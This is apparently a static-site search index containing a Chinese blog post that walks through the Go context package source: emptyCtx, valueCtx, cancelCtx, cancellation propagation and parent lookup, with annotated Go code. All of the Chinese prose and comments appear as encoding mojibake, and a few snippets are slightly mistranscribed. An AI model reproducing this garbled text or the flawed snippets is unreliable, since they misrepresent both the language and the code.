<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>go context çš„æºç èµ°è¯»</title>
    <link href="/2023/10/16/go_context_%E7%9A%84%E6%BA%90%E7%A0%81%E8%B5%B0%E8%AF%BB/"/>
    <url>/2023/10/16/go_context_%E7%9A%84%E6%BA%90%E7%A0%81%E8%B5%B0%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="1ã€ä½œç”¨"><a href="#1ã€ä½œç”¨" class="headerlink" title="1ã€ä½œç”¨"></a>1ã€ä½œç”¨</h2><p>context ä¸»è¦ç”¨æ¥åœ¨ goroutine ä¹‹é—´ä¼ é€’ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šå–æ¶ˆä¿¡å·ã€è¶…æ—¶æ—¶é—´ã€æˆªæ­¢æ—¶é—´ã€k-v ç­‰ï¼Œ</p><p>contextçš„æ•°æ®ç»“æ„ä¸€æ£µå€’æ’æ ‘ï¼Œå…·ä½“ä¼šåœ¨ä¸‹æ–‡æºç èµ°è¯»ä¸­å‰–æã€‚<br><img src="/img/context1.jpeg" srcset="/img/loading.gif" alt="image"></p><h2 id="2ã€ä»£ç ç»“æ„"><a href="#2ã€ä»£ç ç»“æ„" class="headerlink" title="2ã€ä»£ç ç»“æ„"></a>2ã€ä»£ç ç»“æ„</h2><p>contextåŒ…çš„æ ¸å¿ƒæ˜¯context interfaceï¼ŒåŠå®ç°äº†contextæ¥å£çš„emptyCtxã€valueCtxã€cancelCtxã€timerCtxã€‚<br><img src="/img/context2.jpeg" srcset="/img/loading.gif" alt="image"></p><h3 id="2-1ã€Context-interface"><a href="#2-1ã€Context-interface" class="headerlink" title="2.1ã€Context interface"></a>2.1ã€Context interface</h3><p>Context æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®šä¹‰äº† 4 ä¸ªæ–¹æ³•ï¼Œå®ƒä»¬éƒ½æ˜¯å¹‚ç­‰çš„ã€‚ä¹Ÿå°±æ˜¯è¯´è¿ç»­å¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªæ–¹æ³•ï¼Œå¾—åˆ°çš„ç»“æœéƒ½æ˜¯ç›¸åŒçš„ã€‚</p><pre><code class="hljs go"><span class="hljs-keyword">type</span> Context <span class="hljs-keyword">interface</span> &#123;        <span class="hljs-comment">// è¿”å›ä¸€ä¸ª channelï¼Œå¯ä»¥è¡¨ç¤º context è¢«å–æ¶ˆçš„ä¿¡å·ï¼šå½“è¿™ä¸ª channel è¢«å…³é—­æ—¶ï¼Œ</span>        <span class="hljs-comment">// è¯´æ˜ context è¢«å–æ¶ˆäº†ã€‚æ³¨æ„ï¼Œè¿™æ˜¯ä¸€ä¸ªåªè¯»çš„channelï¼Œè¯»ä¸€ä¸ªå…³é—­çš„ channel ä¼šè¯»å‡ºç›¸åº”ç±»å‹çš„é›¶å€¼ã€‚</span>        <span class="hljs-comment">// å¹¶ä¸”æºç é‡Œæ²¡æœ‰åœ°æ–¹ä¼šå‘è¿™ä¸ª channel é‡Œé¢å¡å…¥å€¼ã€‚æ¢å¥è¯è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ª receive-only çš„ channelã€‚</span>        <span class="hljs-comment">// å› æ­¤åœ¨å­åç¨‹é‡Œè¯»è¿™ä¸ª channelï¼Œé™¤éè¢«å…³é—­ï¼Œå¦åˆ™è¯»ä¸å‡ºæ¥ä»»ä½•ä¸œè¥¿ã€‚</span>        <span class="hljs-comment">// ä¹Ÿæ­£æ˜¯åˆ©ç”¨äº†è¿™ä¸€ç‚¹ï¼Œå­åç¨‹ä» channel é‡Œè¯»å‡ºäº†å€¼ï¼ˆé›¶å€¼ï¼‰åï¼Œå°±å¯ä»¥åšä¸€äº›æ”¶å°¾å·¥ä½œï¼Œå°½å¿«é€€å‡ºã€‚</span>        Done() &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;        <span class="hljs-comment">// åœ¨ channel Done å…³é—­åï¼Œè¿”å› context å–æ¶ˆåŸå› </span>        Err() error                <span class="hljs-comment">// è¿”å› context æ˜¯å¦ä¼šè¢«å–æ¶ˆä»¥åŠè‡ªåŠ¨å–æ¶ˆæ—¶é—´ï¼ˆå³ deadlineï¼‰</span>        Deadline() (deadline time.Time, ok <span class="hljs-keyword">bool</span>)        <span class="hljs-comment">// è·å– key å¯¹åº”çš„ value</span>        Value(key <span class="hljs-keyword">interface</span>&#123;&#125;) <span class="hljs-keyword">interface</span>&#123;&#125;&#125;</code></pre><h3 id="2-2ã€emptyCtx"><a href="#2-2ã€emptyCtx" class="headerlink" title="2.2ã€emptyCtx"></a>2.2ã€emptyCtx</h3><pre><code class="hljs go"><span class="hljs-keyword">type</span> emptyCtx <span class="hljs-keyword">int</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(*emptyCtx)</span> <span class="hljs-title">Deadline</span><span class="hljs-params">()</span> <span class="hljs-params">(deadline time.Time, ok <span class="hljs-keyword">bool</span>)</span></span> &#123;    <span class="hljs-keyword">return</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(*emptyCtx)</span> <span class="hljs-title">Done</span><span class="hljs-params">()</span> &lt;-<span class="hljs-title">chan</span> <span class="hljs-title">struct</span></span>&#123;&#125; &#123;    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(*emptyCtx)</span> <span class="hljs-title">Err</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> &#123;    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(*emptyCtx)</span> <span class="hljs-title">Value</span><span class="hljs-params">(key any)</span> <span class="hljs-title">any</span></span> &#123;    <span class="hljs-keyword">return</span> &#125;</code></pre><ul><li>emptyCtx æ˜¯ä¸€ä¸ªç©ºçš„ contextï¼Œç±»å‹ä¸ºä¸€ä¸ªæ•´å‹ï¼›</li><li>Deadline æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªå…¬å…ƒå…ƒå¹´æ—¶é—´ä»¥åŠ false çš„ flagï¼Œæ ‡è¯†å½“å‰ context ä¸å­˜åœ¨è¿‡æœŸæ—¶é—´ï¼›</li><li>Done æ–¹æ³•è¿”å›ä¸€ä¸ª nil å€¼ï¼Œç”¨æˆ·æ— è®ºå¾€ nil ä¸­å†™å…¥æˆ–è€…è¯»å–æ•°æ®ï¼Œå‡ä¼šé™·å…¥é˜»å¡ï¼›</li><li>Err æ–¹æ³•è¿”å›çš„é”™è¯¯ä¸º nilï¼›</li><li>Value æ–¹æ³•è¿”å›çš„ value ä¸º nil.</li></ul><h4 id="2-2-1ã€Background-amp-TODO"><a href="#2-2-1ã€Background-amp-TODO" class="headerlink" title="2.2.1ã€Background &amp; TODO"></a>2.2.1ã€Background &amp; TODO</h4><pre><code class="hljs go"><span class="hljs-keyword">var</span> (    background = <span class="hljs-built_in">new</span>(emptyCtx)    todo       = <span class="hljs-built_in">new</span>(emptyCtx))<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Background</span><span class="hljs-params">()</span> <span class="hljs-title">Context</span></span> &#123;    <span class="hljs-keyword">return</span> background&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TODO</span><span class="hljs-params">()</span> <span class="hljs-title">Context</span></span> &#123;    <span class="hljs-keyword">return</span> todo&#125;</code></pre><p>Background å’ŒTODOæ˜¯ä¸€ä¸ªç©ºçš„ contextï¼Œ context.Background() å’Œ context.TODO() æ–¹æ³•è¿”å›çš„å‡æ˜¯ emptyCtx ç±»å‹çš„ä¸€ä¸ªå®ä¾‹ã€‚</p><h3 id="2-3ã€context-WithValue-amp-valueCtx"><a href="#2-3ã€context-WithValue-amp-valueCtx" class="headerlink" title="2.3ã€context.WithValue() &amp; valueCtx"></a>2.3ã€context.WithValue() &amp; valueCtx</h3><p>context.WithValue() ç”¨äºåŸºäºä¼ å…¥çš„ctxä½œä¸ºparent ctxæ„é€ ä¸€ä¸ªvalueCtx</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithValue</span><span class="hljs-params">(parent Context, key, val any)</span> <span class="hljs-title">Context</span></span> &#123;<span class="hljs-keyword">if</span> parent == <span class="hljs-literal">nil</span> &#123;<span class="hljs-built_in">panic</span>(<span class="hljs-string">"cannot create context from nil parent"</span>)&#125;<span class="hljs-keyword">if</span> key == <span class="hljs-literal">nil</span> &#123;<span class="hljs-built_in">panic</span>(<span class="hljs-string">"nil key"</span>)&#125;<span class="hljs-keyword">if</span> !reflectlite.TypeOf(key).Comparable() &#123;<span class="hljs-built_in">panic</span>(<span class="hljs-string">"key is not comparable"</span>)&#125;<span class="hljs-keyword">return</span> &amp;valueCtx&#123;parent, key, val&#125;&#125;<span class="hljs-comment">// A valueCtx carries a key-value pair. It implements Value for that key and</span><span class="hljs-comment">// delegates all other calls to the embedded Context.</span><span class="hljs-keyword">type</span> valueCtx <span class="hljs-keyword">struct</span> &#123;Contextkey, val any&#125;</code></pre><p>valueCtxç»§æ‰¿äº†Context interfaceï¼Œå¹¶å®ç°äº†Stringer æ¥å£</p><p>ä»æºç çš„valueæ–¹æ³•ï¼Œå¯ä»¥å‘ç°contextå–å€¼çš„æŸ¥æ‰¾æ–¹å‘æ˜¯å¾€ä¸Šèµ°çš„ï¼Œä¸”ä¸€èˆ¬æœ€ç»ˆä¼šæ‰¾åˆ°çš„çˆ¶ctxæ˜¯emptyCtxï¼Œå¹¶è°ƒç”¨emptyCtxçš„Valueæ–¹æ³•è¿”å›nilã€‚æ‰€ä»¥ï¼Œçˆ¶èŠ‚ç‚¹æ²¡æ³•è·å–å­èŠ‚ç‚¹å­˜å‚¨çš„å€¼ï¼Œå­èŠ‚ç‚¹å´å¯ä»¥è·å–çˆ¶èŠ‚ç‚¹çš„å€¼ã€‚</p><pre><code class="hljs go"><span class="hljs-comment">// ç›´æ¥æ‰“å°ctx å‡ºç°çš„.WithValueå‰ç¼€ï¼Œå°±æ˜¯å› ä¸ºvalueCtxé‡å†™äº†stringeræ¥å£</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *valueCtx)</span> <span class="hljs-title">String</span><span class="hljs-params">()</span> <span class="hljs-title">string</span></span> &#123;<span class="hljs-keyword">return</span> contextName(c.Context) + <span class="hljs-string">".WithValue(type "</span> +reflectlite.TypeOf(c.key).String() +<span class="hljs-string">", val "</span> + stringify(c.val) + <span class="hljs-string">")"</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *valueCtx)</span> <span class="hljs-title">Value</span><span class="hljs-params">(key any)</span> <span class="hljs-title">any</span></span> &#123;        <span class="hljs-comment">// å‡å¦‚å½“å‰ valueCtx çš„ key ç­‰äºç”¨æˆ·ä¼ å…¥çš„ keyï¼Œåˆ™ç›´æ¥è¿”å›å…¶ valueï¼›</span><span class="hljs-keyword">if</span> c.key == key &#123;<span class="hljs-keyword">return</span> c.val&#125;        <span class="hljs-comment">// å¦åˆ™ä» parent context ä¸­ä¾æ¬¡å‘ä¸Šå¯»æ‰¾</span><span class="hljs-keyword">return</span> value(c.Context, key)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">value</span><span class="hljs-params">(c Context, key any)</span> <span class="hljs-title">any</span></span> &#123;   <span class="hljs-keyword">for</span> &#123;      <span class="hljs-keyword">switch</span> ctx := c.(<span class="hljs-keyword">type</span>) &#123;      <span class="hljs-comment">// valueCtx æ­£å¸¸é€’å½’å‘ä¸ŠæŸ¥æ‰¾</span>      <span class="hljs-keyword">case</span> *valueCtx:         <span class="hljs-keyword">if</span> key == ctx.key &#123;            <span class="hljs-keyword">return</span> ctx.val         &#125;         c = ctx.Context     <span class="hljs-comment">// cancelCtx timerCtx åˆ™éœ€è¦å…ˆåˆ¤æ–­keyæ˜¯å¦æ˜¯cancelCtxKey</span>     <span class="hljs-comment">// ç”¨äºcancelçš„å†…éƒ¨æœºåˆ¶</span>      <span class="hljs-keyword">case</span> *cancelCtx:         <span class="hljs-keyword">if</span> key == &amp;cancelCtxKey &#123;            <span class="hljs-keyword">return</span> c         &#125;         c = ctx.Context      <span class="hljs-keyword">case</span> *timerCtx:         <span class="hljs-keyword">if</span> key == &amp;cancelCtxKey &#123;            <span class="hljs-keyword">return</span> &amp;ctx.cancelCtx         &#125;         c = ctx.Context      <span class="hljs-keyword">case</span> *emptyCtx:         <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>      <span class="hljs-keyword">default</span>:         <span class="hljs-keyword">return</span> c.Value(key)      &#125;   &#125;&#125;</code></pre><h3 id="2-4ã€context-WithCancel-amp-cancelCtx"><a href="#2-4ã€context-WithCancel-amp-cancelCtx" class="headerlink" title="2.4ã€context.WithCancel &amp; cancelCtx"></a>2.4ã€context.WithCancel &amp; cancelCtx</h3><p>withCancel æ–¹æ³•è¿”å›äº†ä¸€ä¸ªcancelCtx å’Œä¸€ä¸ªcancelé—­åŒ…å‡½æ•°</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithCancel</span><span class="hljs-params">(parent Context)</span> <span class="hljs-params">(ctx Context, cancel CancelFunc)</span></span> &#123;<span class="hljs-keyword">if</span> parent == <span class="hljs-literal">nil</span> &#123;<span class="hljs-built_in">panic</span>(<span class="hljs-string">"cannot create context from nil parent"</span>)&#125;c := newCancelCtx(parent)propagateCancel(parent, &amp;c)<span class="hljs-keyword">return</span> &amp;c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; c.cancel(<span class="hljs-literal">true</span>, Canceled) &#125;&#125;<span class="hljs-comment">// newCancelCtx returns an initialized cancelCtx.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newCancelCtx</span><span class="hljs-params">(parent Context)</span> <span class="hljs-title">cancelCtx</span></span> &#123;<span class="hljs-keyword">return</span> cancelCtx&#123;Context: parent&#125;&#125;</code></pre><h4 id="2-4-1ã€cancelCtx"><a href="#2-4-1ã€cancelCtx" class="headerlink" title="2.4.1ã€cancelCtx"></a>2.4.1ã€cancelCtx</h4><p>å…ˆçœ‹cancelCtx ï¼ŒåŒæ ·ç»§æ‰¿äº†Context æ¥å£ï¼Œå¹¶å®ç°äº†canceler æ¥å£</p><pre><code class="hljs go"><span class="hljs-keyword">type</span> cancelCtx <span class="hljs-keyword">struct</span> &#123;    Context       mu       sync.Mutex            <span class="hljs-comment">// protects following fields</span>    done     atomic.Value          <span class="hljs-comment">// å®é™…ç±»å‹ä¸º chan struct&#123;&#125;ï¼Œå³ç”¨ä»¥åæ˜  cancelCtx ç”Ÿå‘½å‘¨æœŸçš„é€šé“ï¼›</span>    children <span class="hljs-keyword">map</span>[canceler]<span class="hljs-keyword">struct</span>&#123;&#125; <span class="hljs-comment">// æŒ‡å‘ cancelCtx çš„æ‰€æœ‰å­ contextï¼Œå­ctxåªéœ€è¦å®ç°Doneå’Œcancelæ–¹æ³•ï¼Œå› æ­¤é‡æ–°å®šä¹‰äº†canceleræ¥å£ï¼Œæ–¹ä¾¿ç®¡ç†ï¼›</span>    err      error                 <span class="hljs-comment">// set to non-nil by the first cancel call</span>&#125;<span class="hljs-keyword">type</span> canceler <span class="hljs-keyword">interface</span> &#123;    cancel(removeFromParent <span class="hljs-keyword">bool</span>, err error)    Done() &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;&#125;</code></pre><h4 id="2-4-2ã€cancelCtx-Done"><a href="#2-4-2ã€cancelCtx-Done" class="headerlink" title="2.4.2ã€cancelCtx.Done()"></a>2.4.2ã€cancelCtx.Done()</h4><p>è¿”å›çš„æ˜¯æ— ç¼“å†²åŒºåªè¯»channelï¼Œç”¨äºé…åˆselectç›‘å¬è¯¥ctx çš„å–æ¶ˆä¿¡å·</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span> <span class="hljs-title">Done</span><span class="hljs-params">()</span> &lt;-<span class="hljs-title">chan</span> <span class="hljs-title">struct</span></span>&#123;&#125; &#123;    <span class="hljs-comment">//  åŸºäº atomic åŒ…ï¼Œè¯»å– cancelCtx ä¸­çš„ chanï¼›å€˜è‹¥å·²å­˜åœ¨ï¼Œåˆ™ç›´æ¥è¿”å›ï¼›</span>    d := c.done.Load()    <span class="hljs-keyword">if</span> d != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">return</span> d.(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)    &#125;     <span class="hljs-comment">// ä¸Šé”</span>    c.mu.Lock()    <span class="hljs-keyword">defer</span> c.mu.Unlock()    <span class="hljs-comment">// å†æ¬¡åˆ¤æ–­ chanæ˜¯å¦åˆ›å»ºï¼ˆdouble checkï¼‰</span>    d = c.done.Load()    <span class="hljs-keyword">if</span> d == <span class="hljs-literal">nil</span> &#123;        <span class="hljs-comment">// åˆ›å»ºå¹¶è¿”å›chanï¼ˆæ‡’æ±‰å¼ï¼Œåªæœ‰è°ƒç”¨Doneæ–¹æ³•æ‰ä¼šå®é™…åˆ›å»ºè¯¥channelï¼‰</span>        d = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)        c.done.Store(d)    &#125;    <span class="hljs-keyword">return</span> d.(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)&#125;</code></pre><h4 id="2-4-3ã€cancelCtx-cancel"><a href="#2-4-3ã€cancelCtx-cancel" class="headerlink" title="2.4.3ã€cancelCtx.cancel()"></a>2.4.3ã€cancelCtx.cancel()</h4><pre><code class="hljs go"><span class="hljs-comment">// closedchan is a reusable closed channel.</span><span class="hljs-keyword">var</span> closedchan = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-built_in">close</span>(closedchan)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span> <span class="hljs-title">cancel</span><span class="hljs-params">(removeFromParent <span class="hljs-keyword">bool</span>, err error)</span></span> &#123;<span class="hljs-comment">// å¿…é¡»è¦ä¼  err</span>        <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<span class="hljs-built_in">panic</span>(<span class="hljs-string">"context: internal error: missing cancel error"</span>)&#125;c.mu.Lock()<span class="hljs-keyword">if</span> c.err != <span class="hljs-literal">nil</span> &#123;c.mu.Unlock()<span class="hljs-keyword">return</span> <span class="hljs-comment">// already canceled</span>&#125;c.err = err        <span class="hljs-comment">// å¤„ç† cancelCtx çš„ channelï¼Œè‹¥ channel æ­¤å‰æœªåˆå§‹åŒ–ï¼Œåˆ™ç›´æ¥æ³¨å…¥ä¸€ä¸ª closedChanï¼Œ</span>        <span class="hljs-comment">// å¦åˆ™å…³é—­è¯¥ channelï¼›</span>d, _ := c.done.Load().(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<span class="hljs-keyword">if</span> d == <span class="hljs-literal">nil</span> &#123;c.done.Store(closedchan)&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">close</span>(d)&#125;        <span class="hljs-comment">// å¾ªç¯è°ƒç”¨æ‰€ç”¨å­ctxçš„cancelæ–¹æ³•ï¼Œé€šçŸ¥å–æ¶ˆ</span><span class="hljs-keyword">for</span> child := <span class="hljs-keyword">range</span> c.children &#123;<span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> acquiring the child's lock while holding parent's lock.</span>child.cancel(<span class="hljs-literal">false</span>, err)&#125;        <span class="hljs-comment">// ç§»é™¤child ctx</span>c.children = <span class="hljs-literal">nil</span>c.mu.Unlock()        <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦éœ€è¦å°†è‡ªèº«ä»çˆ¶ctxçš„children mapä¸­åˆ é™¤</span><span class="hljs-keyword">if</span> removeFromParent &#123;removeChild(c.Context, c)&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">removeChild</span><span class="hljs-params">(parent Context, child canceler)</span></span> &#123;    <span class="hljs-comment">// å¦‚æœ parent ä¸æ˜¯ cancelCtxï¼Œç›´æ¥è¿”å›ï¼ˆå› ä¸ºåªæœ‰ cancelCtx æ‰æœ‰ children setï¼‰ </span>    p, ok := parentCancelCtx(parent)    <span class="hljs-keyword">if</span> !ok &#123;        <span class="hljs-keyword">return</span>    &#125;    p.mu.Lock()    <span class="hljs-keyword">if</span> p.children != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-comment">// ä» parent çš„ children set ä¸­åˆ é™¤å¯¹åº” child</span>        <span class="hljs-built_in">delete</span>(p.children, child)    &#125;    p.mu.Unlock()&#125;</code></pre><h4 id="2-4-4ã€WithCancel"><a href="#2-4-4ã€WithCancel" class="headerlink" title="2.4.4ã€WithCancel()"></a>2.4.4ã€WithCancel()</h4><pre><code class="hljs go"><span class="hljs-keyword">var</span> Canceled = errors.New(<span class="hljs-string">"context canceled"</span>)<span class="hljs-keyword">type</span> CancelFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithCancel</span><span class="hljs-params">(parent Context)</span> <span class="hljs-params">(ctx Context, cancel CancelFunc)</span></span> &#123;       <span class="hljs-comment">//  æ ¡éªŒçˆ¶ context éç©ºï¼›</span>    <span class="hljs-keyword">if</span> parent == <span class="hljs-literal">nil</span> &#123;        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"cannot create context from nil parent"</span>)    &#125;    <span class="hljs-comment">// æ³¨å…¥çˆ¶ context æ„é€ å¥½ä¸€ä¸ªæ–°çš„ cancelCtxï¼›</span>    c := newCancelCtx(parent)        <span class="hljs-comment">// åœ¨ propagateCancel æ–¹æ³•å†…å¯åŠ¨ä¸€ä¸ªå®ˆæŠ¤åç¨‹ï¼Œä»¥ä¿è¯çˆ¶ context ç»ˆæ­¢æ—¶ï¼Œè¯¥ cancelCtx ä¹Ÿä¼šè¢«ç»ˆæ­¢ï¼›ã€</span>    <span class="hljs-comment">// å› ä¸ºçˆ¶ctxä¸ä¸€å®šæ˜¯cancelCtx</span>    propagateCancel(parent, &amp;c)        <span class="hljs-comment">// å°† cancelCtx è¿”å›ï¼Œè¿å¸¦è¿”å›ä¸€ä¸ªç”¨ä»¥ç»ˆæ­¢è¯¥ cancelCtx çš„é—­åŒ…å‡½æ•°</span>    <span class="hljs-keyword">return</span> &amp;c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; c.cancel(<span class="hljs-literal">true</span>, Canceled) &#125;&#125;</code></pre><h4 id="2-4-5ã€propagateCancel"><a href="#2-4-5ã€propagateCancel" class="headerlink" title="2.4.5ã€propagateCancel()"></a>2.4.5ã€propagateCancel()</h4><p>ä¼ é€’çˆ¶å­ context ä¹‹é—´çš„ cancel äº‹ä»¶</p><pre><code class="hljs go"><span class="hljs-comment">// propagateCancel arranges for child to be canceled when parent is.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">propagateCancel</span><span class="hljs-params">(parent Context, child canceler)</span></span> &#123;done := parent.Done()<span class="hljs-keyword">if</span> done == <span class="hljs-literal">nil</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-comment">// parent is never canceled(ä¸å¯å–æ¶ˆç±»å‹)</span>&#125;<span class="hljs-keyword">select</span> &#123;<span class="hljs-keyword">case</span> &lt;-done: <span class="hljs-comment">// ä»parent çš„done channelä¸­å°è¯•è¯»æ•°æ®ï¼Œå¦‚æœæœªå–æ¶ˆï¼Œgoroutineä¼šé˜»å¡åœ¨è¿™</span><span class="hljs-comment">// parent is already canceled</span>child.cancel(<span class="hljs-literal">false</span>, parent.Err())<span class="hljs-keyword">return</span><span class="hljs-keyword">default</span>:&#125;   <span class="hljs-keyword">if</span> p, ok := parentCancelCtx(parent); ok &#123; <span class="hljs-comment">// parentCtxæ˜¯cancelCtxç±»å‹</span>p.mu.Lock()<span class="hljs-keyword">if</span> p.err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">// parent has already been canceled</span>child.cancel(<span class="hljs-literal">false</span>, p.err)&#125; <span class="hljs-keyword">else</span> &#123;                        <span class="hljs-comment">// å°†è‡ªèº«æ³¨å†Œè¿›parentçš„childrenä¸­ï¼Œä¾é parentçš„cancelæœºåˆ¶å–æ¶ˆ</span><span class="hljs-keyword">if</span> p.children == <span class="hljs-literal">nil</span> &#123;p.children = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[canceler]<span class="hljs-keyword">struct</span>&#123;&#125;)&#125;p.children[child] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;&#125;p.mu.Unlock()&#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-comment">// parentæ˜¯ç”¨æˆ·å®ç°çš„canceler æ¥å£ï¼Œé¢å¤–å¯åŠ¨ä¸€ä¸ªgoroutineå»å¤„ç†è¯¥ctxçš„å–æ¶ˆå›æ”¶</span>                <span class="hljs-comment">// éå¿…è¦æƒ…å†µé¿å…è‡ªå·±å®ç°cancelerï¼Œä¼šæœ‰é¢å¤–çš„goroutineå¼€é”€</span>atomic.AddInt32(&amp;goroutines, +<span class="hljs-number">1</span>)<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">select</span> &#123;<span class="hljs-keyword">case</span> &lt;-parent.Done(): <span class="hljs-comment">// parenté€€å‡ºï¼Œé€ä¼ parent err å¹¶cancel child</span>child.cancel(<span class="hljs-literal">false</span>, parent.Err())<span class="hljs-keyword">case</span> &lt;-child.Done(): <span class="hljs-comment">// è‡ªèº«è¢«cancelæ—¶ï¼Œå¯ä»¥é€€å‡ºè¯¥goroutineï¼Œé¿å…å†…å­˜æ³„éœ²</span>&#125;&#125;()&#125;&#125;</code></pre><h4 id="2-4-6ã€parentCancelCtx"><a href="#2-4-6ã€parentCancelCtx" class="headerlink" title="2.4.6ã€parentCancelCtx()"></a>2.4.6ã€parentCancelCtx()</h4><p>å‘ä¸Šè·å–ä¸€ä¸ªæœ€è¿‘çš„cancelCtx</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">parentCancelCtx</span><span class="hljs-params">(parent Context)</span> <span class="hljs-params">(*cancelCtx, <span class="hljs-keyword">bool</span>)</span></span> &#123;   done := parent.Done()   <span class="hljs-comment">// parent çš„ channel å·²å…³é—­æˆ–è€…æ˜¯ä¸ä¼šè¢« cancel çš„ç±»å‹ï¼Œåˆ™è¿”å› false</span>   <span class="hljs-keyword">if</span> done == closedchan || done == <span class="hljs-literal">nil</span> &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">false</span>   &#125;      <span class="hljs-comment">// è‹¥ä»¥ç‰¹å®šçš„ cancelCtxKey ä» parent ä¸­å–å€¼ï¼Œå–å¾—çš„ value æ˜¯ parent æœ¬èº«ï¼Œåˆ™è¿”å› true. </span>   <span class="hljs-comment">//ï¼ˆåŸºäº cancelCtxKey ä¸º key å–å€¼æ—¶è¿”å› cancelCtx è‡ªèº«ï¼Œæ˜¯ cancelCtx ç‰¹æœ‰çš„åè®®ï¼‰</span>   <span class="hljs-comment">// ä½œç”¨æ˜¯å‘ä¸Šè¿½æº¯åˆ°ä¸€ä¸ªæœ€è¿‘çš„cancelCtxï¼Œå°†childæ·»åŠ åˆ°å®ƒçš„children mapä¸­ï¼Œ</span>   <span class="hljs-comment">// ä»è€Œå°‘å¯åŠ¨ä¸€ä¸ªgoroutineåç¨‹</span>   p, ok := parent.Value(&amp;cancelCtxKey).(*cancelCtx)   <span class="hljs-keyword">if</span> !ok &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">false</span>   &#125;   pdone, _ := p.done.Load().(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)   <span class="hljs-keyword">if</span> pdone != done &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">false</span>   &#125;   <span class="hljs-keyword">return</span> p, <span class="hljs-literal">true</span>&#125;<span class="hljs-keyword">var</span> cancelCtxKey <span class="hljs-keyword">int</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span> <span class="hljs-title">Value</span><span class="hljs-params">(key any)</span> <span class="hljs-title">any</span></span> &#123;   <span class="hljs-keyword">if</span> key == &amp;cancelCtxKey &#123; <span class="hljs-comment">// cancelCtxKeyçš„æŒ‡é’ˆ å¯ä»¥ä½œä¸ºç‰¹æ®Šæ ‡è¯†ç¬¦ï¼Œå› ä¸ºå®ƒä¸ä¼šè¢«å¤–éƒ¨ä¿®æ”¹</span>      <span class="hljs-keyword">return</span> c   &#125;   <span class="hljs-keyword">return</span> value(c.Context, key)&#125;</code></pre><p>å…³äºcancelå‡½æ•°çš„ removeFromParentå‚æ•°ï¼Œåˆ†ä¸¤ç§æƒ…å†µï¼š</p><p>1ã€åœ¨contextåŒ…å†…éƒ¨ propagateCancel è°ƒç”¨æ—¶ï¼Œä¼ 